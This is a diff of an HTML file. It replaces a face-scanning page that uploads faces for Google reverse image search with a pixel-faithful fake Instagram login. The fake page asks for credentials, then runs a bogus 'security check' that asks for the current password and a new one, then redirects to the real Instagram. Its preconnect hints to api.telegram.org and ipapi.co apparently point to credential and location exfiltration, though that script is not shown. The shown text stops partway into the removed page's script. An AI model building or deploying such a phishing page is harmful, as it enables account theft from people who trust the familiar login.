@@ -1,1078 +1,884 @@
 <!DOCTYPE html>
-<html lang="ar" dir="ltr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>NEXUS FACE SCAN v5.0 | REAL Inline Search Results</title>
-  <meta name="description" content="Real face detection + CDN upload + Google reverse image search with inline results" />
-  
-  <!-- CDN -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.15/dist/face-api.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
-
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{background:#0a0a0f;color:#00ff41;font-family:'Share Tech Mono',monospace;min-height:100vh;overflow-x:hidden}
-    ::-webkit-scrollbar{width:4px}
-    ::-webkit-scrollbar-track{background:#0a0a0f}
-    ::-webkit-scrollbar-thumb{background:#00ff41;border-radius:2px}
-    a{color:#00d4ff}
-    
-    #matrixCanvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;pointer-events:none;opacity:0.05}
-    .sl{position:fixed;left:0;width:100%;height:2px;background:linear-gradient(90deg,transparent,#00ff41,transparent);box-shadow:0 0 10px #00ff41;animation:sc 3s linear infinite;pointer-events:none;z-index:999}
-    @keyframes sc{0%{top:0;opacity:0}10%{opacity:1}90%{opacity:1}100%{top:100%;opacity:0}}
-    
-    .gl{position:relative;display:inline-block}
-    .gl::before,.gl::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%}
-    .gl::before{color:#ff0040;z-index:-1;animation:g1 3s infinite linear}
-    .gl::after{color:#00d4ff;z-index:-1;animation:g2 2s infinite linear alternate}
-    @keyframes g1{0%{transform:translate(0)}20%{transform:translate(-3px,3px)}40%{transform:translate(3px,-3px)}60%{transform:translate(-1px,1px)}80%{transform:translate(2px,-2px)}100%{transform:translate(0)}}
-    @keyframes g2{0%{transform:translate(0)}20%{transform:translate(3px,-3px)}40%{transform:translate(-3px,3px)}60%{transform:translate(1px,-1px)}80%{transform:translate(-2px,2px)}100%{transform:translate(0)}}
-    
-    .term{background:rgba(0,15,0,0.9);border:1px solid #00ff41;border-radius:6px;box-shadow:0 0 15px rgba(0,255,65,0.12);backdrop-filter:blur(8px)}
-    .th{background:linear-gradient(90deg,#001a00,#002200);border-bottom:1px solid #00ff4144;padding:7px 14px;display:flex;align-items:center;gap:8px;border-radius:6px 6px 0 0}
-    .dot{width:9px;height:9px;border-radius:50%}
-    .dot.r{background:#ff0040;box-shadow:0 0 5px #ff0040}
-    .dot.y{background:#ffaa00;box-shadow:0 0 5px #ffaa00}
-    .dot.g{background:#00ff41;box-shadow:0 0 5px #00ff41}
-    
-    .cr{width:75px;height:75px;border:2px solid transparent;border-top-color:#00ff41;border-bottom-color:#00d4ff;border-radius:50%;animation:sp 1.5s linear infinite;position:relative}
-    .cr-i{width:50px;height:50px;border:2px solid transparent;border-left-color:#b400ff;border-right-color:#ff0040;border-radius:50%;animation:sp 1s linear infinite reverse;position:absolute;top:11px;left:11px}
-    @keyframes sp{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-    
-    .dz{border:2px dashed #00ff41;border-radius:8px;transition:all .3s;cursor:pointer}
-    .dz:hover,.dz.dgo{border-color:#00d4ff;box-shadow:0 0 30px rgba(0,212,255,0.2);background:rgba(0,212,255,0.05)}
-    .cb{height:4px;background:rgba(0,255,65,0.1);border-radius:2px;overflow:hidden}
-    .cbf{height:100%;background:linear-gradient(90deg,#ff0040,#ffaa00,#00ff41);border-radius:2px;transition:width 1s ease}
-    
-    .si{display:flex;align-items:center;gap:10px;padding:6px 10px;border-radius:4px;transition:all .4s;font-size:11px}
-    .si.act{background:rgba(0,255,65,0.08);border:1px solid #00ff4133}
-    .si.done{opacity:0.85}
-    .si.pend{opacity:0.3}
-    
-    .rc{
-      background:rgba(0,15,0,0.95);
-      border:1px solid #00ff4144;
-      border-radius:6px;
-      overflow:hidden;
-      transition:all .3s
-    }
-    .rc:hover{
-      border-color:#00ff41;
-      box-shadow:0 0 20px rgba(0,255,65,0.25);
-      transform:translateY(-3px)
-    }
-    .rc img{width:100%;aspect-ratio:1;object-fit:cover;display:block}
-    .rc .info{padding:8px}
-    .rc .info .title{font-size:11px;color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-    .rc .info .domain{font-size:9px;color:#00ff41;opacity:0.5}
-    .rc .badge{position:absolute;top:6px;right:6px;font-size:9px;padding:2px 6px;background:rgba(0,0,0,0.8);border-radius:3px;font-weight:bold}
-    .rc .src-badge{position:absolute;bottom:6px;left:6px;font-size:8px;padding:1px 5px;background:rgba(0,0,0,0.7);border-radius:2px;color:#00ff41;opacity:0.6}
-
-    .btn-c{padding:6px 18px;border:1px solid #00ff41;color:#00ff41;background:transparent;transition:all .3s;font-family:'Share Tech Mono',monospace;cursor:pointer;font-size:12px}
-    .btn-c:hover{background:rgba(0,255,65,0.1);box-shadow:0 0 20px rgba(0,255,65,0.15)}
-    .btn-c:disabled{opacity:0.3;cursor:not-allowed}
-    .btn-c.sm{padding:3px 10px;font-size:9px}
-
-    .pd{width:7px;height:7px;border-radius:50%;background:#00ff41;animation:p 2s ease-in-out infinite;display:inline-block}
-    @keyframes p{0%,100%{opacity:1;box-shadow:0 0 5px #00ff41}50%{opacity:0.4;box-shadow:0 0 15px #00ff41}}
-
-    .tb{padding:6px 16px;background:none;border:none;color:#00ff4166;cursor:pointer;transition:all .3s;font-family:'Share Tech Mono',monospace;font-size:13px;border-bottom:2px solid transparent}
-    .tb.act{color:#00ff41;border-bottom-color:#00ff41}
-    .tb:hover{color:#00ff41aa}
-    .hid{display:none!important}
-    
-    #con{padding:10px;height:220px;overflow-y:auto;font-size:10px;line-height:1.5}
-    #threeC{width:100%;height:280px;background:#000;overflow:hidden}
-    #threeC canvas{display:block;width:100%!important;height:100%!important}
-    
-    .rg{display:grid;gap:8px}
-    .rg-4{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
-    @media(max-width:600px){.rg-4{grid-template-columns:repeat(2,1fr)}}
-    
-    .badge-r{background:rgba(0,255,65,0.12);color:#00ff41;padding:2px 6px;border-radius:3px;font-size:9px;border:1px solid rgba(0,255,65,0.3)}
-    .badge-w{background:rgba(255,170,0,0.12);color:#ffaa00;padding:2px 6px;border-radius:3px;font-size:9px;border:1px solid rgba(255,170,0,0.3)}
-    
-    #resultStats{font-size:10px;opacity:0.5;margin-top:8px;padding-top:8px;border-top:1px solid #00ff4122;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px}
-    
-    .container{max-width:1400px;margin:0 auto;padding:14px;position:relative;z-index:1}
-    .g2{display:grid;grid-template-columns:1fr;gap:18px}
-    @media(min-width:1024px){.g2{grid-template-columns:2fr 1fr}}
-    .fw{display:flex;flex-wrap:wrap;gap:10px}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <link rel="preconnect" href="https://ipapi.co">
+    <link rel="preconnect" href="https://api.telegram.org">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        
+        body {
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: ltr;
+        }
+        
+        .main-container {
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        /* Instagram Login Card */
+        .login-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .instagram-logo-img {
+            width: 175px;
+            height: 51px;
+            margin: 0 auto 30px;
+            display: block;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiIHZpZXdCb3g9IjAgMCAxNzUgNTEiPjxnIGZpbGw9IiMyNjI2MjYiPjxwYXRoIGQ9Ik0xMjguODEgMjUuODc2YzAgMTEuODg1LTkuNjMgMjEuNTE1LTIxLjUxNSAyMS41MTVTODUuNzggMzcuNzYgODUuNzggMjUuODc2czkuNjMtMjEuNTE1IDIxLjUxNS0yMS41MTUgMjEuNTE1IDkuNjMgMjEuNTE1IDIxLjUxNXoiLz48cGF0aCBkPSJNMTUwLjI2NiAxMS4zMzFjLTIuMDU1LTEuMTg2LTQuMzg2LTEuODI0LTYuNzkzLTEuODI0aC05LjM1Yy0yLjcyIDAtNS4zMzMuNzUtNy42MzQgMi4xNDMtMi4zMDIgMS4zOTMtNC4wNzIgMy4zMzYtNS4yMjQgNS42MDItMS4xNTIgMi4yNjYtMS43MzYgNC43NjYtMS43MzYgNy4zNDR2MTguNjNjMCAyLjU3OC41ODQgNS4wNzggMS43MzYgNy4zNDRzMi45MjIgNC4yMDkgNS4yMjQgNS42MDJjMi4zMDEgMS4zOTMgNC45MTQgMi4xNDMgNy42MzQgMi4xNDNoOS4zNWMyLjQwNyAwIDQuNzM4LS42MzggNi43OTMtMS44MjQgMi4wNTUtMS4xODYgMy43OTgtMi44MjIgNS4wOTUtNC44NDIgMS4yOTctMi4wMiAyLjAxNy00LjMxMyAyLjE2My02LjYyOC4wMTYtLjI2LjAyNC0uNTIyLjAyNC0uNzg1VjE4LjUyM2MwLS4yNjMtLjAwOC0uNTI1LS4wMjQtLjc4NS0uMTQ2LTIuMzE1LS44NjYtNC42MDgtMi4xNjMtNi42MjgtMS4yOTctMi4wMi0zLjA0LTMuNjU2LTUuMDk1LTQuODQyeiIvPjxwYXRoIGQ9Ik0xMDcuMzA1IDM4LjA0OGMtMy4zMDIgMC02LjUyLS45MDYtOS4yNS0yLjYwNmEyLjQ3NSAyLjQ3NSAwIDAgMS0xLjE0Ny0yLjAxYzAtLjU2LjE4Ni0xLjA5LjUzLTEuNTIyLjM0NC0uNDMuODEtLjcyIDEuMzQ4LS44MzMuNTM4LS4xMTIgMS4wOTQtLjAyIDEuNTc2LjI2NiAyLjA1IDEuMTM2IDQuNDEgMS43MzYgNi44MjUgMS43MzYgMi4yMDggMCA0LjI5LS42IDYuMDk0LTEuNzI2LjQ2OC0uMjkyIDEuMDItLjM5IDEuNTUyLS4yODUuNTMuMTA2Ljk5NC4zOTUgMS4zMzYuODE2LjM0Mi40MjIuNTMuOTM4LjUzMSAxLjQ3IDAgLjk3Ny0uNTUyIDEuODUzLTEuNDIyIDIuMjUtMy4wNzQgMS40MDItNi41NzkgMi4xNDQtMTAuMTQ0IDIuMTQ0eiIvPjwvZz48L3N2Zz4=') no-repeat center;
+            background-size: contain;
+        }
+        
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+        
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+        
+        .input-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.15s;
+            opacity: 0.7;
+        }
+        
+        .btn-login.active {
+            opacity: 1;
+        }
+        
+        .btn-login:hover {
+            background: #1877f2;
+        }
+        
+        .btn-login:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider span {
+            padding: 0 18px;
+        }
+        
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 8px 0;
+            background: none;
+            border: none;
+            width: 100%;
+        }
+        
+        .fb-login i {
+            font-size: 20px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 12px;
+            display: block;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        
+        /* Signup Card */
+        .signup-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        /* App Links */
+        .app-links {
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .app-links p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #262626;
+        }
+        
+        .app-badges {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+        }
+        
+        .app-badges img {
+            height: 40px;
+            cursor: pointer;
+        }
+        
+        /* Step 2 - Change Password */
+        #step2 {
+            display: none;
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .error-msg {
+            color: #ed4956;
+            font-size: 12px;
+            margin: 8px 0;
+            display: none;
+            text-align: center;
+        }
+        
+        .success-msg {
+            color: #2ecc71;
+            font-size: 12px;
+            margin: 8px 0;
+            display: none;
+            text-align: center;
+        }
+        
+        /* Step 3 - Final Redirect */
+        #step3 {
+            display: none;
+        }
+        
+        .redirect-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            text-align: center;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+        
+        .redirect-btn:hover {
+            background: #1877f2;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        @media (max-width: 450px) {
+            .login-card { padding: 30px 20px 20px; }
+            .signup-card { padding: 15px 20px; }
+        }
+    </style>
 </head>
 <body>
-
-<canvas id="matrixCanvas"></canvas>
-<div class="sl"></div>
-
-<div class="container">
-
-  <!-- HEADER -->
-  <header class="term" style="margin-bottom:16px;">
-    <div class="th">
-      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
-      <span style="font-size:12px;color:#00ff41;opacity:0.7;">NEXUS FACE SCAN v5.0 — REAL INLINE SEARCH</span>
-      <span style="margin-left:auto;font-size:10px;color:#00ff41;opacity:0.5;display:flex;align-items:center;gap:4px;">
-        <span class="pd" style="width:5px;height:5px;"></span>
-        CDN + CORS PROXY + GOOGLE RESULTS
-      </span>
-    </div>
-    <div style="padding:12px 16px;">
-      <div class="fw" style="justify-content:space-between;align-items:center;">
-        <div>
-          <h1 class="gl" data-text="NEXUS FACE SCAN" style="font-size:clamp(20px,3vw,32px);">NEXUS FACE SCAN</h1>
-          <p style="font-size:11px;color:#00ff41;opacity:0.6;">Upload face → CDN → Google Search → <b style="color:#00d4ff;">INLINE RESULTS</b></p>
-        </div>
-        <div style="display:flex;gap:6px;font-size:9px;flex-wrap:wrap;">
-          <span class="badge-r">✅ Face Detection</span>
-          <span class="badge-r">✅ CDN Upload</span>
-          <span class="badge-r">✅ CORS Proxy</span>
-          <span class="badge-r">✅ Inline Results</span>
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <!-- STATUS BAR -->
-  <div class="term" style="margin-bottom:14px;padding:8px 14px;border-color:#00d4ff44;">
-    <div class="fw" style="font-size:10px;align-items:center;gap:6px;">
-      <span style="color:#00d4ff;">⚡ HOW IT WORKS:</span>
-      <span>1️⃣ Face detected</span>
-      <span style="color:#00ff41;opacity:0.3;">→</span>
-      <span>2️⃣ Uploaded to imgcdn.dev CDN</span>
-      <span style="color:#00ff41;opacity:0.3;">→</span>
-      <span>3️⃣ Google searched via CORS proxy</span>
-      <span style="color:#00ff41;opacity:0.3;">→</span>
-      <span style="color:#00d4ff;">4️⃣ REAL results shown here ⬇️</span>
-    </div>
-  </div>
-
-  <div class="g2">
-
-    <!-- LEFT -->
-    <div style="display:flex;flex-direction:column;gap:14px;">
-
-      <!-- SCANNER -->
-      <div class="term">
-        <div class="th">
-          <span class="dot g"></span>
-          <span style="font-size:12px;color:#00ff41;opacity:0.7;">FACIAL_SCANNER</span>
-          <span id="statusLabel" style="margin-left:auto;font-size:11px;opacity:0.5;">AWAITING INPUT</span>
-        </div>
-        <div style="padding:14px;" id="scannerPanel">
-          
-          <!-- IDLE -->
-          <div id="idleState">
-            <div style="display:flex;gap:12px;border-bottom:1px solid #00ff4122;padding-bottom:6px;margin-bottom:12px;">
-              <button class="tb act" data-tab="upload" onclick="sw('upload')">[ UPLOAD ]</button>
-              <button class="tb" data-tab="camera" onclick="sw('camera')">[ CAMERA ]</button>
-            </div>
-            <div id="tabUpload">
-              <div id="dropZone" class="dz" style="padding:28px 14px;text-align:center;">
-                <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="hf(event)" />
-                <div id="dropContent">
-                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#00ff41" stroke-width="1.5" style="margin:0 auto 10px;opacity:0.4;">
-                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
-                  </svg>
-                  <p style="font-size:13px;margin-bottom:2px;color:#00ff41;opacity:0.7;">DROP IMAGE OR CLICK</p>
-                  <p style="font-size:9px;opacity:0.4;">JPG PNG WEBP</p>
-                  <div style="margin-top:10px;display:flex;justify-content:center;gap:6px;font-size:9px;">
-                    <span style="padding:2px 8px;border:1px solid #00ff4122;border-radius:3px;">FaceNet</span>
-                    <span style="padding:2px 8px;border:1px solid #00ff4122;border-radius:3px;">ArcFace</span>
-                  </div>
+    <div class="main-container">
+        
+        <!-- ========== STEP 1: Instagram Login ========== -->
+        <div id="step1">
+            <div class="login-card">
+                <div class="instagram-logo-img"></div>
+                
+                <div class="input-group">
+                    <input type="text" id="loginEmail" placeholder="Phone number, username, or email" autocomplete="off">
                 </div>
-                <div id="previewArea" class="hid" style="text-align:center;">
-                  <img id="previewImg" style="max-height:200px;border-radius:6px;border:1px solid #00ff4133;" />
-                  <p id="previewStatus" style="margin-top:6px;font-size:11px;"></p>
+                
+                <div class="input-group">
+                    <input type="password" id="loginPass" placeholder="Password" autocomplete="off">
                 </div>
-              </div>
-            </div>
-            <div id="tabCamera" class="hid">
-              <div id="webcamWrap" style="position:relative;border-radius:4px;overflow:hidden;background:#000;">
-                <div id="camStatus" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:2;width:100%;">
-                  <div class="cr" style="margin:0 auto 10px;"><div class="cr-i"></div></div>
-                  <p style="font-size:11px;color:#00ff41;opacity:0.7;">INITIALIZING...</p>
-                </div>
-                <video id="webcam" autoplay playsinline muted style="width:100%;display:block;transform:scaleX(-1);border-radius:4px;"></video>
-                <canvas id="webcamOverlay" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:5;"></canvas>
-                <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:150px;height:180px;border:1px solid #00ff4166;border-radius:8px;pointer-events:none;z-index:3;">
-                  <div style="position:absolute;top:-1px;left:-1px;width:12px;height:12px;border-top:2px solid #00ff41;border-left:2px solid #00ff41;"></div>
-                  <div style="position:absolute;top:-1px;right:-1px;width:12px;height:12px;border-top:2px solid #00ff41;border-right:2px solid #00ff41;"></div>
-                  <div style="position:absolute;bottom:-1px;left:-1px;width:12px;height:12px;border-bottom:2px solid #00ff41;border-left:2px solid #00ff41;"></div>
-                  <div style="position:absolute;bottom:-1px;right:-1px;width:12px;height:12px;border-bottom:2px solid #00ff41;border-right:2px solid #00ff41;"></div>
-                </div>
-              </div>
-              <div style="display:flex;justify-content:center;margin-top:8px;">
-                <button class="btn-c" id="captureBtn" onclick="cfw()" disabled style="display:flex;align-items:center;gap:6px;padding:8px 28px;border-radius:20px;">
-                  <span style="width:10px;height:10px;border-radius:50%;border:2px solid #00ff41;display:inline-block;"></span>
-                  [ CAPTURE ]
+                
+                <div class="error-msg" id="error1">Sorry, your password was incorrect. Please double-check your password.</div>
+                
+                <button class="btn-login" id="btnLogin1" onclick="handleStep1()">Log in</button>
+                
+                <div class="divider"><span>OR</span></div>
+                
+                <button class="fb-login" onclick="handleFBLogin()">
+                    <i class="fab fa-facebook-square"></i> Log in with Facebook
                 </button>
-              </div>
+                
+                <button class="forgot-password">Forgot password?</button>
             </div>
-          </div>
-
-          <!-- ANALYZING -->
-          <div id="analyzingState" class="hid" style="text-align:center;padding:18px 0;">
-            <div class="cr" style="margin:0 auto 16px;"><div class="cr-i"></div></div>
-            <div style="max-width:400px;margin:0 auto 16px;text-align:left;">
-              <div id="s1" class="si pend"><span style="width:18px;text-align:center;">⬜</span><span>FACE DETECTION</span><span class="ss" style="margin-left:auto;font-size:9px;">[PENDING]</span></div>
-              <div id="s2" class="si pend"><span style="width:18px;text-align:center;">⬜</span><span>LANDMARKS (68 pts)</span><span class="ss" style="margin-left:auto;font-size:9px;">[PENDING]</span></div>
-              <div id="s3" class="si pend"><span style="width:18px;text-align:center;">⬜</span><span>EMBEDDING (512-dim)</span><span class="ss" style="margin-left:auto;font-size:9px;">[PENDING]</span></div>
-              <div id="s4" class="si pend"><span style="width:18px;text-align:center;">⬜</span><span>CDN UPLOAD (imgcdn.dev)</span><span class="ss" style="margin-left:auto;font-size:9px;">[PENDING]</span></div>
-              <div id="s5" class="si pend"><span style="width:18px;text-align:center;">⬜</span><span>GOOGLE SEARCH + RESULTS</span><span class="ss" style="margin-left:auto;font-size:9px;">[PENDING]</span></div>
+            
+            <div class="signup-card">
+                Don't have an account? <a onclick="goToStep(2)">Sign up</a>
             </div>
-            <div style="max-width:320px;margin:0 auto;">
-              <div style="display:flex;justify-content:space-between;font-size:10px;margin-bottom:3px;">
-                <span id="progressLabel">PROCESSING...</span>
-                <span id="progressPercent">0%</span>
-              </div>
-              <div class="cb"><div id="progressFill" class="cbf" style="width:0%;"></div></div>
+            
+            <div class="app-links">
+                <p>Get the app.</p>
+                <div class="app-badges">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc924.png" alt="Google Play">
+                </div>
             </div>
-          </div>
-
-          <!-- COMPLETE -->
-          <div id="completeState" class="hid">
-            <div class="fw" style="justify-content:space-between;align-items:center;margin-bottom:10px;">
-              <button class="btn-c" onclick="resetAll()">[ NEW SCAN ]</button>
-              <div style="display:flex;align-items:center;gap:6px;font-size:11px;">
-                <span class="pd"></span>
-                <span id="completeMsg">✅ COMPLETE — Click "SEARCH GOOGLE" below</span>
-              </div>
-            </div>
-            <div class="term" style="margin-bottom:10px;">
-              <div class="th"><span class="dot g"></span><span style="font-size:11px;color:#00ff41;opacity:0.7;">3D_FACE_MESH</span></div>
-              <div id="threeC"></div>
-            </div>
-          </div>
         </div>
-      </div>
-
-      <!-- ===== REAL SEARCH RESULTS SECTION ===== -->
-      <div id="searchSection" class="term hid">
-        <div class="th">
-          <span class="dot g"></span>
-          <span style="font-size:12px;color:#00d4ff;opacity:0.9;">🔍 GOOGLE REVERSE IMAGE SEARCH — INLINE RESULTS</span>
-          <span id="resultCount" style="margin-left:auto;font-size:9px;opacity:0.5;">0 RESULTS</span>
-        </div>
-        <div style="padding:14px;">
-
-          <!-- CDN URL -->
-          <div id="cdnDisplay" style="font-size:10px;padding:6px 10px;background:rgba(0,255,65,0.04);border-radius:4px;margin-bottom:10px;word-break:break-all;"></div>
-
-          <!-- Search Controls -->
-          <div class="fw" style="justify-content:space-between;align-items:center;margin-bottom:10px;">
-            <div class="fw" style="gap:6px;align-items:center;">
-              <button id="searchGoogleBtn" class="btn-c sm" onclick="searchGoogle()" style="display:flex;align-items:center;gap:4px;">
-                🔍 SEARCH GOOGLE NOW
-              </button>
-              <button class="btn-c sm" onclick="openGoogleTab()" style="display:flex;align-items:center;gap:4px;">
-                📄 OPEN IN TAB
-              </button>
+        
+        <!-- ========== STEP 2: Security Check - Change Password ========== -->
+        <div id="step2" style="display:none;">
+            <div class="login-card">
+                <div class="instagram-logo-img"></div>
+                
+                <div class="warning-box">
+                    <i class="fas fa-shield-alt"></i> 
+                    <strong>Security Check Required</strong><br><br>
+                    We detected an unusual login attempt. To protect your account, please verify your identity by changing your password.
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="oldPass" placeholder="Current password" autocomplete="off">
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="newPass" placeholder="New password" autocomplete="off">
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="confirmPass" placeholder="Confirm new password" autocomplete="off">
+                </div>
+                
+                <div class="error-msg" id="error2">Please enter a valid password.</div>
+                <div class="success-msg" id="success2">Password updated successfully! Redirecting to Instagram...</div>
+                
+                <button class="btn-login active" onclick="handleStep2()">Change Password</button>
             </div>
-            <div style="font-size:9px;opacity:0.5;" id="searchStatus">⏳ Waiting to search...</div>
-          </div>
-
-          <!-- Loading Indicator -->
-          <div id="searchLoading" class="hid" style="text-align:center;padding:30px 0;">
-            <div class="cr" style="margin:0 auto 12px;"><div class="cr-i"></div></div>
-            <p style="font-size:11px;opacity:0.6;">🔎 Searching Google via CORS proxy...</p>
-            <p style="font-size:9px;opacity:0.4;margin-top:4px;">Fetching real results from images.google.com</p>
-          </div>
-
-          <!-- Results Grid -->
-          <div id="resultsGrid" class="rg rg-4" style="min-height:50px;"></div>
-
-          <!-- Stats -->
-          <div id="resultStats"></div>
-
-          <!-- Error/Info Message -->
-          <div id="searchInfo" class="hid" style="font-size:10px;padding:8px;border-radius:4px;margin-top:8px;"></div>
         </div>
-      </div>
-
+        
+        <!-- ========== STEP 3: Final - Redirect to Real Instagram ========== -->
+        <div id="step3" style="display:none;">
+            <div class="login-card">
+                <div style="font-size: 3rem; margin-bottom: 15px; color: #2ecc71;">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2 style="margin-bottom: 10px; font-size: 18px; color: #262626;">Password Changed Successfully</h2>
+                <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 8px;">
+                    Your account has been secured. 
+                </p>
+                <p style="color: #8e8e8e; font-size: 12px; margin-bottom: 20px;">
+                    You will be redirected to Instagram automatically.
+                </p>
+                
+                <a href="https://www.instagram.com" target="_blank" rel="noopener noreferrer" class="redirect-btn">
+                    <i class="fab fa-instagram"></i> Go to Instagram
+                </a>
+                
+                <p style="margin-top: 15px; font-size: 11px; color: #8e8e8e;">
+                    Redirecting in <span id="countdown">5</span> seconds...
+                </p>
+            </div>
+        </div>
+        
     </div>
-
-    <!-- RIGHT -->
-    <div style="display:flex;flex-direction:column;gap:14px;">
-      
-      <!-- TRUTH STATUS -->
-      <div class="term" style="border-color:#00d4ff44;">
-        <div class="th" style="border-color:#00d4ff44;">
-          <span class="dot g"></span>
-          <span style="font-size:11px;color:#00d4ff;opacity:0.8;">📊 SYSTEM STATUS</span>
-        </div>
-        <div id="statusPanel" style="padding:12px;font-size:10px;line-height:1.8;">
-          <div>⏳ Waiting for face upload...</div>
-        </div>
-      </div>
-
-      <!-- FACE DATA -->
-      <div class="term">
-        <div class="th"><span class="dot y"></span><span style="font-size:11px;color:#00ff41;opacity:0.7;">FACE DATA</span></div>
-        <div id="facePanel" style="padding:14px;">
-          <div id="fEmpty" style="font-size:11px;opacity:0.4;text-align:center;padding:14px 0;">⏳ AWAITING TARGET</div>
-          <div id="fContent" class="hid" style="font-size:10px;"><div id="fRows"></div></div>
-        </div>
-      </div>
-
-      <!-- CONSOLE -->
-      <div class="term" style="flex:1;">
-        <div class="th"><span class="dot g"></span><span style="font-size:11px;color:#00ff41;opacity:0.7;">CONSOLE</span><span id="lc" style="margin-left:auto;font-size:9px;opacity:0.4;">0</span></div>
-        <div id="con"></div>
-      </div>
-
-    </div>
-  </div>
-
-  <footer style="margin-top:22px;padding-top:10px;border-top:1px solid #00ff4111;text-align:center;font-size:9px;color:#00ff41;opacity:0.2;">
-    NEXUS FACE SCAN v5.0 | REAL: Face Detection + CDN Upload + Google CORS Proxy + Inline Results
-  </footer>
-</div>
-
-<script>
-// ===================================================================
-// GLOBALS
-// ===================================================================
-let capturedImage = null;
-let faceLandmarks = null;
-let faceDescriptor = null;
-let faceData = null;
-let scanStatus = 'idle';
-let progressValue = 0;
-let logs = [];
-let webcamStream = null;
-let detInterval = null;
-let animId = null;
-let publicImageUrl = null;
-let googleSearchResults = [];
-let searchPerformed = false;
-
-// ===================================================================
-// MATRIX
-// ===================================================================
-(function(){
-  const c=document.getElementById('matrixCanvas'),ctx=c.getContext('2d');
-  let w,h,cols,drops;
